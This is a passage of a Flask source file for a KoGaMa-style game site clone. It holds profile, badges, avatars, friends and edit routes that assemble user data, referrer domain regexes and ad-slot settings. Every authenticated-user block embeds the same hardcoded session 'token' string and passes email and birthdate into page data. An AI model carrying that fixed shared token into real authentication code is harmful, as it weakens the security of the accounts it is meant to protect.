             "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id": 7,
             "name": "CRAZYGAMES",
             "codename": "crazygames",
             "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id": 8,
             "name": "SpilGames",
             "codename": "spilgames",
             "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data": {
          "host": "www.kogama.com",
          "ref": 1,
          "consent": True,
          "name": "Google AdManager (old account)",
          "ads": {
             "top_banner": {
                "num": "0",
                "id": "kogama_mobile_leaderboard_1",
                "ad_unit_code": "leaderboard",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "skyscraper_left": {
                "num": "1",
                "id": "kogama-skyscraper-left",
                "ad_unit_code": "skyscraper_left",
                "sizes": "[160, 600]"
             },
             "skyscraper_right": {
                "num": "2",
                "id": "kogama-skyscraper-right",
                "ad_unit_code": "skyscraper",
                "sizes": "[160, 600]"
             },
             "bottom_banner": {
                "num": "4",
                "id": "kogama_mobile_leaderboard_2",
                "ad_unit_code": "leaderboard_bottom",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "comment_ad": {
                "num": "5",
                "id": "kogama_rectangle",
                "ad_unit_code": "rectangle",
                "sizes": "[300, 250]"
             },
             "wide_skyscraper": {
                "num": "3",
                "id": "kogama-wide-skyscraper",
                "ad_unit_code": "wide_skyscraper",
                "sizes": "[300, 600]"
             },
             "game_list_banner": {
                "num": "6",
                "id": "kogama_mobile_game_list_banner",
                "ad_unit_code": "game_list_banner",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             }
          },
          "network_code": "46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    submenu_data = [{'url': '/help/support/', 'title': 'Support', 'key': 'support'}, {'url': '/help/privacy-policy/', 'title': 'Privacy Policy', 'key': 'privacy'}, {'url': '/help/terms-and-conditions/', 'title': 'Terms &amp; Conditions', 'key': 'terms_and_conditions'}, {'url': '/help/cookies/', 'title': 'Cookies', 'key': 'cookies'}, {'url': '/help/publishing/', 'title': 'KaGaMa Publishing', 'key': 'publishing'}];
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data=submenu_data, object_data=object_data), 200

@app.route('/profile/admin/')
def profile_admin_redirect():
    return redirect(url_for('profile', user_id=1))

@app.route('/profile/<int:user_id>/')
def profile(user_id):
    user = db.session.get(User, user_id)
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    if not user:
        abort(404)
    friend_rel = None
    if current_user.is_authenticated:
        friend_rel = db.session.query(Friend).filter(or_(and_(Friend.profile_id == current_user.id, Friend.friend_profile_id == user.id), and_(Friend.profile_id == user.id, Friend.friend_profile_id == current_user.id))).first()
    object_data = {
       "object":{
          "gold":user.gold,
          "friends":user.friends,
          "last_ping": user.last_ping.isoformat() if user.last_ping else None,
          "leaderboard_rank":user.rank,
          "is_anonymous":False,
          "next_level_xp":user.next_level_xp,
          "id":user.id,
          "xp":user.xp,
          "created":user.created.isoformat() if user.created else None,
          "level_progress":user.level_progress,
          "level_images":get_level_images(user._level),
          "previous_level_xp":user.previous_level_xp,
          "images": user.AVATAR_IMAGES_MAP.get(user.avatar_id, {}),
          "username":user.username,
          "is_me":current_user.is_authenticated and current_user.id == user.id,
          "published":0,
          "xp_to_next_level":user.xp_to_next_level,
          "avatar_id":17873,
          "friends_limit":999,
          "notifications":0,
          "level":user._level,
          "description":user.description,
          "is_active":True,
          "pulse_status":user.pulse_status,
          "is_authenticated":False,
          "is_subscriber":False,
          "object_type_id":1
       },
       "created_avatar":{
           "user_id":user.id,
           "username":user.username,
           "avatar_id":17873,
           "images": user.AVATAR_IMAGES_MAP.get(user.avatar_id, {}),
           "avatar_name":user.AVATAR_IMAGES_MAP.get(user.avatar_id, {}).get("avatar_name", ""),
           "is_active":True
        },
       "created_avatar_total":0,
       "friend": friend_rel.to_dict() if friend_rel else None,
       "locale":user_language,
       "referrers":[
          {
             "referrer_id":1,
             "name":"Kagama",
             "codename":"kogama",
             "urls":""
          },
          {
             "referrer_id":2,
             "name":"old_spilgames",
             "codename":"OldSpilGames",
             "urls":""
          },
          {
             "referrer_id":3,
             "name":"AdNPlay",
             "codename":"adnplay",
             "urls":""
          },
          {
             "referrer_id":4,
             "name":"GSM",
             "codename":"gsm",
             "urls":"games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id":5,
             "name":"Miniplay",
             "codename":"miniplay",
             "urls":"minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id":6,
             "name":"ORANGE",
             "codename":"orange",
             "urls":"kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id":7,
             "name":"CRAZYGAMES",
             "codename":"crazygames",
             "urls":"crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id":8,
             "name":"SpilGames",
             "codename":"spilgames",
             "urls":"cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data":{
          "host":"www.kogama.com",
          "ref":1,
          "consent":True,
          "name":"Google AdManager (old account)",
          "ads":{
             "top_banner":{
                "num":"0",
                "id":"kogama_mobile_leaderboard_1",
                "ad_unit_code":"leaderboard",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "skyscraper_left":{
                "num":"1",
                "id":"kogama-skyscraper-left",
                "ad_unit_code":"skyscraper_left",
                "sizes":"[160, 600]"
             },
             "skyscraper_right":{
                "num":"2",
                "id":"kogama-skyscraper-right",
                "ad_unit_code":"skyscraper",
                "sizes":"[160, 600]"
             },
             "bottom_banner":{
                "num":"4",
                "id":"kogama_mobile_leaderboard_2",
                "ad_unit_code":"leaderboard_bottom",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "comment_ad":{
                "num":"5",
                "id":"kogama_rectangle",
                "ad_unit_code":"rectangle",
                "sizes":"[300, 250]"
             },
             "wide_skyscraper":{
                "num":"3",
                "id":"kogama-wide-skyscraper",
                "ad_unit_code":"wide_skyscraper",
                "sizes":"[300, 600]"
             },
             "game_list_banner":{
                "num":"6",
                "id":"kogama_mobile_game_list_banner",
                "ad_unit_code":"game_list_banner",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             }
          },
          "network_code":"46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["is_friend"] = (current_user.id != user.id and friend_rel is not None and friend_rel.friend_status == "accepted")
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data="null", object_data=object_data), 200

@app.route('/profile/<int:user_id>/badges/')
def profile_badges(user_id):
    user = db.session.get(User, user_id)
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    if not user:
        abort(404)
    object_data = {
       "object":{
          "gold":user.gold,
          "friends":user.friends,
          "last_ping": user.last_ping.isoformat() if user.last_ping else None,
          "leaderboard_rank":user.rank,
          "is_anonymous":False,
          "next_level_xp":user.next_level_xp,
          "id":user.id,
          "xp":user.xp,
          "created":user.created.isoformat() if user.created else None,
          "level_progress":user.level_progress,
          "level_images":get_level_images(user._level),
          "previous_level_xp":user.previous_level_xp,
          "images": user.AVATAR_IMAGES_MAP.get(user.avatar_id, {}),
          "username":user.username,
          "is_me":current_user.is_authenticated and current_user.id == user.id,
          "published":0,
          "xp_to_next_level":user.xp_to_next_level,
          "avatar_id":17873,
          "friends_limit":999,
          "notifications":0,
          "level":user._level,
          "description":user.description,
          "is_active":True,
          "pulse_status":user.pulse_status,
          "is_authenticated":False,
          "is_subscriber":False,
          "object_type_id":1
       },
      "locale": user_language,
      "ads_data":{
          "host":"www.kogama.com",
          "ref":1,
          "consent":True,
          "name":"Google AdManager (old account)",
          "ads":{
             "top_banner":{
                "num":"0",
                "id":"kogama_mobile_leaderboard_1",
                "ad_unit_code":"leaderboard",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "skyscraper_left":{
                "num":"1",
                "id":"kogama-skyscraper-left",
                "ad_unit_code":"skyscraper_left",
                "sizes":"[160, 600]"
             },
             "skyscraper_right":{
                "num":"2",
                "id":"kogama-skyscraper-right",
                "ad_unit_code":"skyscraper",
                "sizes":"[160, 600]"
             },
             "bottom_banner":{
                "num":"4",
                "id":"kogama_mobile_leaderboard_2",
                "ad_unit_code":"leaderboard_bottom",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "comment_ad":{
                "num":"5",
                "id":"kogama_rectangle",
                "ad_unit_code":"rectangle",
                "sizes":"[300, 250]"
             },
             "wide_skyscraper":{
                "num":"3",
                "id":"kogama-wide-skyscraper",
                "ad_unit_code":"wide_skyscraper",
                "sizes":"[300, 600]"
             },
             "game_list_banner":{
                "num":"6",
                "id":"kogama_mobile_game_list_banner",
                "ad_unit_code":"game_list_banner",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             }
          },
          "network_code":"46278883"
        }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    breadcrumb_data = [{'url': f'/profile/{user_id}/', 'title': user.username}, {'url': f'/profile/{user_id}/badges/', 'title': 'Badges'}]
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data=breadcrumb_data, submenu_data="null", object_data=object_data), 200

@app.route('/profile/<int:user_id>/avatars/')
def profile_avatars(user_id):
    user = db.session.get(User, user_id)
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    if not user:
        abort(404)
    object_data = {
       "object":{
          "gold":user.gold,
          "friends":user.friends,
          "last_ping": user.last_ping.isoformat() if user.last_ping else None,
          "leaderboard_rank":user.rank,
          "is_anonymous":False,
          "next_level_xp":user.next_level_xp,
          "id":user.id,
          "xp":user.xp,
          "created":user.created.isoformat() if user.created else None,
          "level_progress":user.level_progress,
          "level_images":get_level_images(user._level),
          "previous_level_xp":user.previous_level_xp,
          "images": user.AVATAR_IMAGES_MAP.get(user.avatar_id, {}),
          "username":user.username,
          "is_me":current_user.is_authenticated and current_user.id == user.id,
          "published":0,
          "xp_to_next_level":user.xp_to_next_level,
          "avatar_id":17873,
          "friends_limit":999,
          "notifications":0,
          "level":user._level,
          "description":user.description,
          "is_active":True,
          "pulse_status":user.pulse_status,
          "is_authenticated":False,
          "is_subscriber":False,
          "object_type_id":1
       },
      "locale": user_language,
      "ads_data":{
          "host":"www.kogama.com",
          "ref":1,
          "consent":True,
          "name":"Google AdManager (old account)",
          "ads":{
             "top_banner":{
                "num":"0",
                "id":"kogama_mobile_leaderboard_1",
                "ad_unit_code":"leaderboard",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "skyscraper_left":{
                "num":"1",
                "id":"kogama-skyscraper-left",
                "ad_unit_code":"skyscraper_left",
                "sizes":"[160, 600]"
             },
             "skyscraper_right":{
                "num":"2",
                "id":"kogama-skyscraper-right",
                "ad_unit_code":"skyscraper",
                "sizes":"[160, 600]"
             },
             "bottom_banner":{
                "num":"4",
                "id":"kogama_mobile_leaderboard_2",
                "ad_unit_code":"leaderboard_bottom",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "comment_ad":{
                "num":"5",
                "id":"kogama_rectangle",
                "ad_unit_code":"rectangle",
                "sizes":"[300, 250]"
             },
             "wide_skyscraper":{
                "num":"3",
                "id":"kogama-wide-skyscraper",
                "ad_unit_code":"wide_skyscraper",
                "sizes":"[300, 600]"
             },
             "game_list_banner":{
                "num":"6",
                "id":"kogama_mobile_game_list_banner",
                "ad_unit_code":"game_list_banner",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             }
          },
          "network_code":"46278883"
        }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    breadcrumb_data = [{'url': f'/profile/{user_id}/', 'title': user.username}, {'url': f'/profile/{user_id}/avatars/', 'title': 'Avatars'}]
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data=breadcrumb_data, submenu_data="null", object_data=object_data), 200

@app.route('/profile/<int:user_id>/friends/')
def profile_friends(user_id):
    user = db.session.get(User, user_id)
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    if not user:
        abort(404)
    object_data = {
        "object":{
        "gold":user.gold,
        "friends": user.friends,
        "last_ping": user.last_ping.isoformat() if user.last_ping else None,
        "leaderboard_rank":user.rank,
        "is_anonymous":False,
        "next_level_xp":user.next_level_xp,
        "id":user.id,
        "xp":user.xp,
        "created":user.created.isoformat() if user.created else None,
        "level_progress":user.level_progress,
        "level_images": get_level_images(user._level),
        "previous_level_xp":user.previous_level_xp,
        "images": avatar_images_for(user.avatar_id),
        "username":user.username,
        "is_me":current_user.is_authenticated and current_user.id == user.id,
        "published":0,
        "xp_to_next_level":user.xp_to_next_level,
        "avatar_id":17873,
        "friends_limit":999,
        "notifications":0,
        "level":user._level,
        "description":user.description,
        "is_active":True,
        "pulse_status":user.pulse_status,
        "is_authenticated":False,
        "is_subscriber":False,
        "object_type_id":1
        },
        "locale": user_language,
        "referrers": [
            {"referrer_id": 1, "name": "Kagama", "codename": "kogama", "urls": ""},
            {"referrer_id": 2, "name": "old_spilgames", "codename": "OldSpilGames", "urls": ""},
            {"referrer_id": 3, "name": "AdNPlay", "codename": "adnplay", "urls": ""},
            {"referrer_id": 4, "name": "GSM", "codename": "gsm", "urls": "games\\.poki\\.com|..."},
            {"referrer_id": 5, "name": "Miniplay", "codename": "miniplay", "urls": "minijuegos\\.com|..."},
            {"referrer_id": 6, "name": "ORANGE", "codename": "orange", "urls": "kizi\\.com|..."},
            {"referrer_id": 7, "name": "CRAZYGAMES", "codename": "crazygames", "urls": "crazygames\\.com|..."},
            {"referrer_id": 8, "name": "SpilGames", "codename": "spilgames", "urls": "cdn\\.gameplayer\\.io|..."}
        ],
        "now": "2026-05-27T02:21:30.794785+00:00",
        "ads_data": {
            "host": "www.kogama.com",
            "ref": "kogama",
            "consent": True,
            "name": "Google AdManager (old account)",
            "ads": {
                "top_banner": {"num": "0", "id": "kogama_mobile_leaderboard_1", "ad_unit_code": "leaderboard", "sizes": "[728, 90]"},
                "skyscraper_left": {"num": "1", "id": "kogama-skyscraper-left", "sizes": "[160, 600]"},
                "skyscraper_right": {"num": "2", "id": "kogama-skyscraper-right", "sizes": "[160, 600]"},
                "bottom_banner": {"num": "4", "id": "kogama_mobile_leaderboard_2", "sizes": "[728, 90]"},
                "comment_ad": {"num": "5", "id": "kogama_rectangle", "sizes": "[300, 250]"},
                "wide_skyscraper": {"num": "3", "id": "kogama-wide-skyscraper", "sizes": "[300, 600]"},
                "game_list_banner": {"num": "6", "id": "kogama_mobile_game_list_banner", "sizes": "[728, 90]"}
            },
            "network_code": "46278883"
        }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    breadcrumb_data = [{'url': f'/profile/{user_id}/', 'title': user.username}, {'url': f'/profile/{user_id}/friends/', 'title': 'Friends'}]
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data=breadcrumb_data, submenu_data="null", object_data=object_data), 200

@app.route('/profile/<int:user_id>/edit/')
def profile_edit(user_id):
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    object_data = {
      "object": {
            "gold": current_user.gold,
